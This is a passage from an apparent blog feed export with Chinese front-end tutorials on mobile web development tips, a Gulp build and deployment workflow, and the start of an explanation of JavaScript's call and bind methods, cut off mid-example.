      <content type="text"><![CDATA[meta基础知识H5页面窗口自动调整到设备宽度，并禁止用户缩放页面&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no&quot; /&gt; 忽略将页面中的数字识别为电话号码&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot; /&gt; 忽略Android平台中对邮箱地址的识别&lt;meta name=&quot;format-detection&quot; content=&quot;email=no&quot; /&gt; &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot; /&gt; &lt;!-- ios7.0版本以后，safari上已看不到效果 --&gt; 将网站添加到主屏幕快速启动方式，仅针对ios的safari顶端状态条的样式&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot; /&gt; &lt;!-- 可选default、black、black-translucent --&gt; viewport模板viewport模板——通用&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta content=&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no&quot; name=&quot;viewport&quot;&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-mobile-web-app-capable&quot;&gt; &lt;meta content=&quot;black&quot; name=&quot;apple-mobile-web-app-status-bar-style&quot;&gt; &lt;meta content=&quot;telephone=no&quot; name=&quot;format-detection&quot;&gt; &lt;meta content=&quot;email=no&quot; name=&quot;format-detection&quot;&gt; &lt;title&gt;标题&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;index.css&quot;&gt; &lt;/head&gt; &lt;body&gt; 这里开始内容 &lt;/body&gt; &lt;/html&gt; viewport模板 – target-densitydpi=device-dpi，android 2.3.5以下版本不支持 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=750, user-scalable=no, target-densitydpi=device-dpi&quot;&gt;&lt;!-- width取值与页面定义的宽度一致 --&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-mobile-web-app-capable&quot;&gt; &lt;meta content=&quot;black&quot; name=&quot;apple-mobile-web-app-status-bar-style&quot;&gt; &lt;meta content=&quot;telephone=no&quot; name=&quot;format-detection&quot;&gt; &lt;meta content=&quot;email=no&quot; name=&quot;format-detection&quot;&gt; &lt;title&gt;标题&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;index.css&quot;&gt; &lt;/head&gt; &lt;body&gt; 这里开始内容 &lt;/body&gt; &lt;/html&gt; 参考案例：http://action.weixin.qq.com/payact/readtemplate?t=Mobile/2015/wxzfsht/index_tmpl 常见问题移动端如何定义字体font-family中文字体使用系统默认即可，英文用Helvetica /* 移动端定义字体的代码 */ body{font-family:Helvetica;} 参考《移动端使用字体的思考》 移动端字体单位font-size选择px还是rem对于只需要适配少部分手机设备，且分辨率对页面影响不大的，使用px即可著作权归作者所有。商业转载请联系作者获得授权,非商业转载请注明出处。链接:http://caibaojian.com/mobile-knowledge.html来源:http://caibaojian.com 对于需要适配各种移动设备，使用rem，例如只需要适配iphone和iPad等分辨率差别比较挺大的设备rem配置参考： html{font-size:10px} @media screen and (min-width:321px) and (max-width:375px){html{font-size:11px}} @media screen and (min-width:376px) and (max-width:414px){html{font-size:12px}} @media screen and (min-width:415px) and (max-width:639px){html{font-size:15px}} @media screen and (min-width:640px) and (max-width:719px){html{font-size:20px}} @media screen and (min-width:720px) and (max-width:749px){html{font-size:22.5px}} @media screen and (min-width:750px) and (max-width:799px){html{font-size:23.5px}} @media screen and (min-width:800px){html{font-size:25px}} 移动端touch事件(区分webkit 和 winphone)当用户手指放在移动设备在屏幕上滑动会触发的touch事件以下支持webkit1.touchstart——当手指触碰屏幕时候发生。不管当前有多少只手指2.touchmove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用event的preventDefault()可以阻止默认情况的发生：阻止页面滚动3.touchend——当手指离开屏幕时触发4.touchcancel——系统停止跟踪触摸时候会触发。例如在触摸过程中突然页面alert()一个提示框，此时会触发该事件，这个事件比较少用TouchEvent1.touches：屏幕上所有手指的信息2.targetTouches：手指在目标区域的手指信息3.changedTouches：最近一次触发该事件的手指信息4.touchend时，touches与targetTouches信息会被删除，changedTouches保存的最后一次的信息，最好用于计算手指信息参数信息(changedTouches[0])1.clientX、clientY在显示区的坐标2.target：当前元素参考：https://developer.mozilla.org/en-US/docs/web/API/TouchEvent以下支持winphone 81.MSPointerDown——当手指触碰屏幕时候发生。不管当前有多少只手指2.MSPointerMove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用css的html{-ms-touch-action: none;}可以阻止默认情况的发生：阻止页面滚动3.MSPointerUp——当手指离开屏幕时触发 移动端click屏幕产生200-300 ms的延迟响应移动设备上的web网页是有300ms延迟的，玩玩会造成按钮点击延迟甚至是点击失效。以下是历史原因，来源一个公司内一个同事的分享：2007年苹果发布首款iphone上IOS系统搭载的safari为了将适用于PC端上大屏幕的网页能比较好的展示在手机端上，使用了双击缩放(double tap to zoom)的方案，比如你在手机上用浏览器打开一个PC上的网页，你可能在看到页面内容虽然可以撑满整个屏幕，但是字体、图片都很小看不清，此时可以快速双击屏幕上的某一部分，你就能看清该部分放大后的内容，再次双击后能回到原始状态。双击缩放是指用手指在屏幕上快速点击两次，iOS 自带的 Safari 浏览器会将网页缩放至原始比例。原因就出在浏览器需要如何判断快速点击上，当用户在屏幕上单击某一个元素时候，例如跳转链接，此处浏览器会先捕获该次单击，但浏览器不能决定用户是单纯要点击链接还是要双击该部分区域进行缩放操作，所以，捕获第一次单击后，浏览器会先Hold一段时间t，如果在t时间区间里用户未进行下一次点击，则浏览器会做单击跳转链接的处理，如果t时间里用户进行了第二次单击操作，则浏览器会禁止跳转，转而进行对该部分区域页面的缩放操作。那么这个时间区间t有多少呢？在IOS safari下，大概为300毫秒。这就是延迟的由来。造成的后果用户纯粹单击页面，页面需要过一段时间才响应，给用户慢体验感觉，对于web开发者来说是，页面JS捕获click事件的回调函数处理，需要300ms后才生效，也就间接导致影响其他业务逻辑的处理。解决方案：1.fastclick可以解决在手机上点击事件的300ms延迟2.zepto的touch模块，tap事件也是为了解决在click的延迟问题触摸事件的响应顺序1.ontouchstart2.ontouchmove3.ontouchend4.onclick解决300ms延迟的问题，也可以通过绑定ontouchstart事件，加快对事件的响应 什么是Retina 显示屏，带来了什么问题retina：一种具备超高像素密度的液晶屏，同样大小的屏幕上显示的像素点由1个变为多个，如在同样带下的屏幕上，苹果设备的retina显示屏中，像素点1个变为4个在高清显示屏中的位图被放大，图片会变得模糊，因此移动端的视觉稿通常会设计为传统PC的2倍那么，前端的应对方案是：设计稿切出来的图片长宽保证为偶数，并使用backgroud-size把图片缩小为原来的1/2//例如图片宽高为：200px*200px，那么写法如下 .css{width:100px;height:100px;background-size:100px 100px;} 其它元素的取值为原来的1/2，例如视觉稿40px的字体，使用样式的写法为20px .css{font-size:20px} 参考《高清显示屏原理及设计方案》ios系统中元素被触摸时产生的半透明灰色遮罩怎么去掉ios用户点击一个链接，会出现一个半透明灰色遮罩, 如果想要禁用，可设置-webkit-tap-highlight-color的alpha值为0，也就是属性值的最后一位设置为0就可以去除半透明灰色遮罩 a,button,input,textarea{-webkit-tap-highlight-color: rgba(0,0,0,0;)} 部分android系统中元素被点击时产生的边框怎么去掉android用户点击一个链接，会出现一个边框或者半透明灰色遮罩, 不同生产商定义出来额效果不一样，可设置-webkit-tap-highlight-color的alpha值为0去除部分机器自带的效果 a,button,input,textarea{ -webkit-tap-highlight-color: rgba(0,0,0,0;) -webkit-user-modify:read-write-plaintext-only; } -webkit-user-modify有个副作用，就是输入法不再能够输入多个字符另外，有些机型去除不了，如小米2对于按钮类还有个办法，不使用a或者input标签，直接用div标签参考《如何去除android上a标签产生的边框》winphone系统a、input标签被点击时产生的半透明灰色背景怎么去掉 &lt;meta name=&quot;msapplication-tap-highlight&quot; content=&quot;no&quot;&gt; webkit表单元素的默认外观怎么重置 .css{-webkit-appearance:none;} webkit表单输入框placeholder的颜色值能改变么 input::-webkit-input-placeholder{color:#AAAAAA;} input:focus::-webkit-input-placeholder{color:#EEEEEE;} webkit表单输入框placeholder的文字能换行么ios可以，android不行~在textarea标签下都可以换行~IE10（winphone8）表单元素默认外观如何重置禁用 select 默认下拉箭头::-ms-expand 适用于表单选择控件下拉箭头的修改，有多个属性值，设置它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。 select::-ms-expand { display: none; } 禁用 radio 和 checkbox 默认样式::-ms-check 适用于表单复选框或单选按钮默认图标的修改，同样有多个属性值，设置它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。 input[type=radio]::-ms-check, input[type=checkbox]::-ms-check { display: none; } 禁用PC端表单输入框默认清除按钮当表单文本输入框输入内容后会显示文本清除按钮，::-ms-clear 适用于该清除按钮的修改，同样设置使它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。 input[type=text]::-ms-clear, input[type=tel]::-ms-clear, input[type=number]::-ms-clear { display: none; } 禁止ios 长按时不触发系统的菜单，禁止ios&amp;android长按时下载图片.css{-webkit-touch-callout: none} 禁止ios和android用户选中文字.css{-webkit-user-select:none} 参考《如何改变表单元素的外观(for Webkit and IE10) 打电话发短信写邮件怎么实现打电话&lt;a href=&quot;tel:0755-10086&quot;&gt;打电话给:0755-10086&lt;/a&gt; 发短信，winphone系统无效&lt;a href=&quot;sms:10086&quot;&gt;发短信给: 10086&lt;/a&gt; 写邮件，可参考《移动web页面给用户发送邮件的方法》&lt;a href=&quot;mailto:peun@foxmail.com&quot;&gt;peun@foxmail.com&lt;/a&gt; 模拟按钮hover效果移动端触摸按钮的效果，可明示用户有些事情正要发生，是一个比较好体验，但是移动设备中并没有鼠标指针，使用css的hover并不能满足我们的需求，还好国外有个激活css的active效果，代码如下， &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta content=&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no&quot; name=&quot;viewport&quot;&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-mobile-web-app-capable&quot;&gt; &lt;meta content=&quot;black&quot; name=&quot;apple-mobile-web-app-status-bar-style&quot;&gt; &lt;meta content=&quot;telephone=no&quot; name=&quot;format-detection&quot;&gt; &lt;meta content=&quot;email=no&quot; name=&quot;format-detection&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; a{-webkit-tap-highlight-color: rgba(0,0,0,0);} .btn-blue{display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color: #4185F3;} .btn-blue:active{background-color: #357AE8;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;btn-blue&quot;&gt;按钮&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.addEventListener(&quot;touchstart&quot;, function(){}, true) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 兼容性ios5+、部分android 4+、winphone 8要做到全兼容的办法，可通过绑定ontouchstart和ontouchend来控制按钮的类名 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta content=&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no&quot; name=&quot;viewport&quot;&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-mobile-web-app-capable&quot;&gt; &lt;meta content=&quot;black&quot; name=&quot;apple-mobile-web-app-status-bar-style&quot;&gt; &lt;meta content=&quot;telephone=no&quot; name=&quot;format-detection&quot;&gt; &lt;meta content=&quot;email=no&quot; name=&quot;format-detection&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; a{-webkit-tap-highlight-color: rgba(0,0,0,0);} .btn-blue{display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color: #4185F3;} .btn-blue-on{background-color: #357AE8;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;btn-blue&quot;&gt;按钮&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var btnBlue = document.querySelector(&quot;.btn-blue&quot;); btnBlue.ontouchstart = function(){ this.className = &quot;btn-blue btn-blue-on&quot; } btnBlue.ontouchend = function(){ this.className = &quot;btn-blue&quot; } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 屏幕旋转的事件和样式事件window.orientation，取值：正负90表示横屏模式、0和180表现为竖屏模式； window.onorientationchange = function(){ switch(window.orientation){ case -90: case 90: alert(&quot;横屏:&quot; + window.orientation); case 0: case 180: alert(&quot;竖屏:&quot; + window.orientation); break; } } 样式 //竖屏时使用的样式 @media all and (orientation:portrait) { .css{} } //横屏时使用的样式 @media all and (orientation:landscape) { .css{} } audio元素和video元素在ios和andriod中无法自动播放应对方案：触屏即播 $(&apos;html&apos;).one(&apos;touchstart&apos;,function(){ audio.play() }) 可参考《无法自动播放的audio元素》 摇一摇功能HTML5 deviceMotion：封装了运动传感器数据的事件，可以获取手机运动状态下的运动加速度等数据。手机拍照和上传图片 &lt;input type=”file”&gt;的accept 属性&lt;br&gt; &lt;!-- 选择照片 --&gt; &lt;input type=file accept=&quot;image/*&quot;&gt; &lt;!-- 选择视频 --&gt; &lt;input type=file accept=&quot;video/*&quot;&gt; 使用总结：ios 有拍照、录像、选取本地图片功能部分android只有选取本地图片功能winphone不支持input控件默认外观丑陋微信浏览器用户调整字体大小后页面矬了，怎么阻止用户调整原因android侧是复写了layoutinflater 对textview做了统一处理ios侧是修改了body.style.webkitTextSizeAdjust值解决方案：android使用以下代码，该接口只在微信浏览器下有效(感谢jationhuang同学提供) /** * 页面加入这段代码可使Android机器页面不再受到用户字体缩放强制改变大小 * 但是会有一个1秒左右的延迟，期间可以考虑通过loading展示 * 仅供参考 */ (function(){ if (typeof(WeixinJSBridge) == &quot;undefined&quot;) { document.addEventListener(&quot;WeixinJSBridgeReady&quot;, function (e) { setTimeout(function(){ WeixinJSBridge.invoke(&apos;setFontSizeCallback&apos;,{&quot;fontSize&quot;:0}, function(res) { alert(JSON.stringify(res)); }); },0); }); } else { setTimeout(function(){ WeixinJSBridge.invoke(&apos;setFontSizeCallback&apos;,{&quot;fontSize&quot;:0}, function(res) { alert(JSON.stringify(res)); }); },0); } })(); ios使用-webkit-text-size-adjust禁止调整字体大小 body{-webkit-text-size-adjust: 100%!important;} 最好的解决方案：整个页面用rem或者百分比布局消除transition闪屏网络都是这么写的，但我并没有测试出来 .css{ /*设置内嵌的元素在 3D 空间如何呈现：保留 3D*/ -webkit-transform-style: preserve-3d; /*（设置进行转换的元素的背面在面对用户时是否可见：隐藏）*/ -webkit-backface-visibility: hidden; } 开启硬件加速解决页面闪白保证动画流畅.css { -webkit-transform: translate3d(0, 0, 0); -moz-transform: translate3d(0, 0, 0); -ms-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0); } 参考《用CSS开启硬件加速来提高网站性能》取消input在ios下，输入的时候英文首字母的默认大写 &lt;input autocapitalize=&quot;off&quot; autocorrect=&quot;off&quot; /&gt; android 上去掉语音输入按钮 input::-webkit-input-speech-button {display: none} android 2.3 bug1.@-webkit-keyframes 需要以0%开始100%结束，0%的百分号不能去掉2.after和before伪类无法使用动画animation3.border-radius不支持%单位4.translate百分比的写法和scale在一起会导致失效，例如-webkit-transform: translate(-50%,-50%) scale(-0.5, 1) android 4.x bug1.三星 Galaxy S4中自带浏览器不支持border-radius缩写2.同时设置border-radius和背景色的时候，背景色会溢出到圆角以外部分3.部分手机(如三星)，a链接支持鼠标:visited事件，也就是说链接访问后文字变为紫色4.android无法同时播放多音频audio参考《border-radius 移动之伤》 设计高性能css3动画的几个要素1.尽可能地使用合成属性transform和opacity来设计CSS3动画，不使用position的left和top来定位2.利用translate3D开启GPU加速参考《High Performance Animations》 fixed bug1.ios下fixed元素容易定位出错，软键盘弹出时，影响fixed元素定位2.android下fixed表现要比iOS更好，软键盘弹出时，不会影响fixed元素定位3.ios4下不支持position:fixed 解决方案可用isroll.js，暂无完美方案参考《移动端web页面使用position:fixed问题总结》《使用iScroll.js解决ios4下不支持position:fixed的问题》如何阻止windows Phone的默认触摸事件winphone下默认触摸事件事件使用e.preventDefault是无效的目前解决方法是使用样式来禁用 html{-ms-touch-action: none;}/* 禁止winphone默认触摸事件 */ 参考《Windows phone 8 touch support》 播放视频不全屏&lt;!-- 1.ios7+支持自动播放 2.支持Airplay的设备（如：音箱、Apple TV)播放 x-webkit-airplay=&quot;true&quot; 3.播放视频不全屏 webkit-playsinline=&quot;true&quot; --&gt; &lt;video x-webkit-airplay=&quot;true&quot; webkit-playsinline=&quot;true&quot; preload=&quot;auto&quot; autoplay src=&quot;http://&quot;&gt;&lt;/video&gt; 常用的移动端框架zepto.js语法与jquery几乎一样，会jquery基本会zepto~最新版本已经更新到1.16官网：http://zeptojs.com/中文(非官网)：http://www.css88.com/doc/zeptojs_api/常使用的扩展模块：浏览器检测：https://github.com/madrobby/zepto/blob/master/src/detect.jstap事件：https://github.com/madrobby/zepto/blob/master/src/touch.js iscroll.js解决页面不支持弹性滚动，不支持fixed引起的问题~实现下拉刷新，滑屏，缩放等功能~最新版本已经更新到5.0官网：http://cubiq.org/iscroll-5 underscore.js笔者没用过，不过听说好用，推荐给大家~该库提供了一整套函数式编程的实用功能，但是没有扩展任何javascript内置对象。最新版本已经更新到1.8.2官网：http://underscorejs.org/ 滑屏框架适合上下滑屏、左右滑屏等滑屏切换页面的效果slip.jsiSlider.jsfullpage.js flex布局flex布局目前可使用在移动中，并非所有的语法都全兼容，但以下写法笔者实践过，效果良好~ /* ============================================================ flex：定义布局为盒模型 flex-v：盒模型垂直布局 flex-1：子元素占据剩余的空间 flex-align-center：子元素垂直居中 flex-pack-center：子元素水平居中 flex-pack-justify：子元素两端对齐 兼容性：ios 4+、android 2.3+、winphone8+ ============================================================ */ .flex{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;} .flex-v{-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;} .flex-1{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;} .flex-align-center{-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;} .flex-pack-center{-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;} .flex-pack-justify{-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;} 示例：两端对齐 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta content=&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no&quot; name=&quot;viewport&quot;&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-mobile-web-app-capable&quot;&gt; &lt;meta content=&quot;black&quot; name=&quot;apple-mobile-web-app-status-bar-style&quot;&gt; &lt;meta content=&quot;telephone=no&quot; name=&quot;format-detection&quot;&gt; &lt;meta content=&quot;email=no&quot; name=&quot;format-detection&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; /* ============================================================ flex：定义布局为盒模型 flex-v：盒模型垂直布局 flex-1：子元素占据剩余的空间 flex-align-center：子元素垂直居中 flex-pack-center：子元素水平居中 flex-pack-justify：子元素两端对齐 兼容性：ios 4+、android 2.3+、winphone8+ ============================================================ */ .flex{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;} .flex-v{-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;} .flex-1{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;} .flex-align-center{-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;} .flex-pack-center{-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;} .flex-pack-justify{-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;} &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;flex flex-pack-justify&quot;&gt; &lt;div&gt;模块一&lt;/div&gt; &lt;div&gt;模块二&lt;/div&gt; &lt;div&gt;模块三&lt;/div&gt; &lt;div&gt;模块四&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 使用注意：flex下的子元素必须为块级元素，非块级元素在android2.3机器下flex失效参考：flexyboxes“老”的Flexbox和“新”的Flexbox跨浏览器的Flexbox FastClick消除在移动浏览器上触发click事件与一个物理Tap(敲击)之间的300延迟参考《FastClick》转载：http://peunzhang.cnblogs.com/原文链接：移动前端知识总结转自：前端开发博客 http://caibaojian.com/mobile-knowledge.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用Gulp优化部署Web项目👗]]></title>
      <url>%2F2016%2F04%2F15%2F21%2F</url>
      <content type="text"><![CDATA[GulpGulp是一款项目自动化的构建工具，与Grunt一样可以通过创建任务（Task）来帮助我们自动完成一些工作流的内容。当然，今天我们的内容并不是讨论这二者的区别，仅仅是介绍介绍如何利用Gulp来优化我们的Web项目中前端自动化工作流。 引言相信不少人看过百度大牛张云龙的那篇讲解大公司里怎样开发和部署前端代码?的文章，如果没有阅读的朋友请戳。由于在项目部署时，我们需要对项目js，css,image等文件进行压缩，合并处理，从而减少客户端对服务Http请求，已达到增强页面的加载速度，优化服务器带宽压力等等目的。所以本文主要讲的是利用Gulp优化我们Web部署优化工作。 安装&amp;初始化首先你得确保你的电脑上面是否已经安装了Nodejs, 如果没有安装的话，那么请移步。假定有如下一个Nodejs的Web项目（当然你也可以是其他的例如Java，.Net的Web项目，且具体开发目录如下： |- project |- src // 前端项目的源文件 |- js |- html |- images |- css |- bower_component // bower 前端依赖包管理 |- node_component // nodejs 插件 |- server |- api |- views |- app |- assets // 前端静态文件存放目录 |- js |- css |- images |- templates |- ... // 其他目录就不一一列出了 src文件夹为前端的js，css, html, image的开发目录, 我们会通过gulp将这些源文件进行压缩合并后打包到目标目录，也就是assets目录下相应的js,css目录，html视图文件会打包到views下的app文件夹和assets下的templates模板文件夹，具体视情况而定。其中的bower_component为bower前端包管理，我们可以用bower直接下载几乎任何我们前端日常所需的库，框架,而且可以任选版本，例如JQuery,Bootstrap,Angular，只需执行bower install packageName即可，不同版本只需bower install packageName#version,更多内容，可以去官网自行查阅，这里就不展开了。至于node_component 文件夹即是用npm安装的我们打包会用到的插件资源了。 1.全局安装Gulp$ npm install --global gulp 2.安装Gulp到开发项目中$ npm install --save-dev gulp 3.在src创建gulpfile.js文件，这个文件用来配置我们所需的task,接下来会具体讲解。4.执行$ gulp 或者 $ gulp taskName gulp会执行gulpfile.js文件下定义的default任务，如果我们需要执行特定的task，则需要执行下面的命令 gulpfile.js文件gulpfile.js用来定义我们需要自动化的任务，里面包含了很多依赖关系。这里我们会创建4个Task，第一个develop task,用于开发时使用，另一个release task,用于部署发布时用的，还有一个watch task, 用于实时监听文件修改行为，可及时打包，最后一个default task, gulp默认执行的task. 创建Default Task var gulp = require(&apos;gulp&apos;); gulp.task(&apos;default&apos;, function() { // place code for your default task here }); // 如果默认情况下我们会执行一个叫develop的task，则这么写，执行gulp命令时， // 会自动调用develop gulp.task(&apos;default&apos;, [&apos;develop&apos;]); 创建Develop Task创建develop task前，先介绍下我们今天要用到的一些插件1.gulp-uglify Js压缩插件2.gulp-minify-css Css压缩插件3.gulp-imagemin图片压缩插件，支持格式： PNG, JPEG, GIF and SVG images4.gulp-strip-debug清除源文件console,debugger代码5.gulp-useref合并压缩html文件中的文件以上列出的插件为我个人常用的一些插件，如果你还有fonts文件的话，也可以添加进去，gulp有很多其他或者相似的插件，都可以去google搜索。安装方法则是正常的npm安装，可以戳进官网去查看。首先我们需要为我们要压缩的源文件配置路径以及导入插件，假设我们bower里面已有jquery和bootstrap插件，以及其他源文件目录，如下： // 引入插件 var uglify = require(&apos;gulp-uglify&apos;); // 压缩 var minifyCss = require(&apos;gulp-minify-css&apos;); var stripDebug = require(&apos;gulp-strip-debug&apos;); // 该插件用来去掉console和debugger语句 var useref = require(&apos;gulp-useref&apos;); var imagemin = require(&apos;gulp-imagemin&apos;); var pngquant = require(&apos;imagemin-pngquant&apos;); // 任务处理的文件路径配置 var paths = { js: [ // js目录 &apos;app/*&apos; ], css: [ &apos;css/*&apos; ], img: [ &apos;images/*&apos; ], html: [ &apos;html/*&apos; ], lib: { // 第三方依赖文件 js: [ &apos;bower_components/bootstrap/dist/js/bootstrap.js&apos;, &apos;bower_components/jquery/jquery.js&apos; ], css: [ &apos;bower_components/bootstrap/dist/css/bootstrap.css&apos; ], img: [ &apos;bower_components/bootstrap/dist/images/*&apos; ] } }; 定义develop task var output = &quot;../server/assets/&quot;; // output /* 开发环境 */ gulp.task(&apos;develop&apos;, function() { gulp.src(paths.js) .pipe(gulp.dest(output + &apos;/js&apos;)); gulp.src(paths.lib.js) .pipe(gulp.dest(output + &apos;/js&apos;)); gulp.src(paths.css) .pipe(gulp.dest(output + &apos;/css&apos;)); gulp.src(paths.lib.css) .pipe(gulp.dest(output + &apos;/css&apos;)); gulp.src(paths.img) .pipe(gulp.dest(output + &apos;/images&apos;)); gulp.src(paths.lib.img) .pipe(gulp.dest(output + &apos;/images&apos;)); }); 上面的develop task直接将代码都输出到了我们的server目录下，并未通过插件进行相应的处理，主要是因为我们等会还会创建release task， 当真正部署的时候我们才进行压缩合并这些处理。定义release task /* 部署环境 */ gulp.task(&apos;release&apos;, function() { gulp.src(paths.js) .pipe(stripDebug()) .pipe(gulp.dest(output + &apos;/js&apos;)); gulp.src(paths.lib.js) .pipe(stripDebug()) .pipe(gulp.dest(output + &apos;/js&apos;)); gulp.src(paths.css) .pipe(gulp.dest(output + &apos;/css&apos;)); gulp.src(paths.lib.css) .pipe(gulp.dest(output + &apos;/css&apos;)); gulp.src(paths.img) .pipe(imagemin({ progressive: true, svgoPlugins: [{removeViewBox: false}], use: [pngquant()] })) .pipe(gulp.dest(output + &apos;/images&apos;)); gulp.src(paths.lib.img) .pipe(imagemin({ progressive: true, svgoPlugins: [{removeViewBox: false}], use: [pngquant()] })) .pipe(gulp.dest(output + &apos;/images&apos;)); var assets = useref.assets(); gulp.src(paths.html) .pipe(assets) .pipe(gulpif(&apos;*.js&apos;, uglify())) .pipe(gulpif(&apos;*.css&apos;, minifyCss())) .pipe(assets.restore()) .pipe(useref()) .pipe(gulp.dest(output + &apos;/templates&apos;)); }); 上面的代码首先是先打包静态文件到指定包，去掉多余的console,debugger,给图片文件进行压缩处理，最后利用useref插件对ejs视图文件中的js,css进行压缩合并处理，并打包到指定目录。利用useref对html内部的文件进行压缩合并上面的release中我们以及定义了对app目录下html文件内部的js，css进行压缩何必，仅仅配置task是还不够的，我还需要在html内部做如下配置： &lt;html&gt; &lt;head&gt; &lt;!-- build:css css/main.css --&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;css/bootstrap.cs.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;!-- endbuild --&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- build:js scripts/main.js --&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/bootstrap.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt; &lt;!-- endbuild --&gt; &lt;/body&gt; &lt;/html&gt; 经过合并后的文件： &lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/main.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/htm&gt; 更多关于gulp-useref的使用方法请戳。定义watch Taskwatch task 是为了监听文件发生改变后立即触发的任务，已便于我们开发。代码如下： var watcher = gulp.watch(paths.scripts, [&apos;develop&apos;]); watcher.on(&apos;change&apos;, function (event) { console.log(&apos;Event type: &apos; + event.type); // added, changed, or deleted console.log(&apos;Event path: &apos; + event.path); // The path of the modified file }); 总结以上基本介绍了如何使用gulp来自动完成打包，压缩，合并文件等任务，Gulp插件非常多，本文只是简单的介绍了几种基本的。总之，使用gulp，只需要几行命令便可以完成以上任务，使很多优化工作变得十分简单。 原文地址：http://imziv.com/blog/article/read.htm?id=60 作者： Ziv小威 转自：http://www.imziv.com/blog/article/read.htm?id=60]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[回味js基础:call/bind🍕]]></title>
      <url>%2F2016%2F04%2F11%2F20%2F</url>
      <content type="text"><![CDATA[在JavaScript中，call、apply和bind是Function对象自带的三个方法，本文将通过几个场景的应用，来详细理解三个方法。 call()call() 方法在使用一个指定的this值和若干个指定的参数值的前提下调用某个函数或方法。 当调用一个函数时，可以赋值一个不同的 this 对象。this 引用当前对象，即call方法的第一个参数。通过 call 方法，你可以在一个对象上借用另一个对象上的方法，比如Object.prototype.toString.call([])，就是一个Array对象借用了Object对象上的方法。 语法 fun.call(thisArg[, arg1[, arg2[, ...]]]) thisArg在fun函数运行时指定的this值。需要注意的是下面几种情况（1）不传，或者传null，undefined， 函数中的this指向window对象（2）传递另一个函数的函数名，函数中的this指向这个函数的引用，并不一定是该函数执行时真正的this值（3）值为原始值(数字，字符串，布尔值)的this会指向该原始值的自动包装对象，如 String、Number、Boolean（4）传递一个对象，函数中的this指向这个对象 arg1, arg2, …指定的参数列表。例子初级应用例子 function a(){ //输出函数a中的this对象 console.log(this); } //定义函数b function b(){} var obj = {name:&apos;这是一个屌丝&apos;}; //定义对象obj a.call(); //window a.call(null); //window 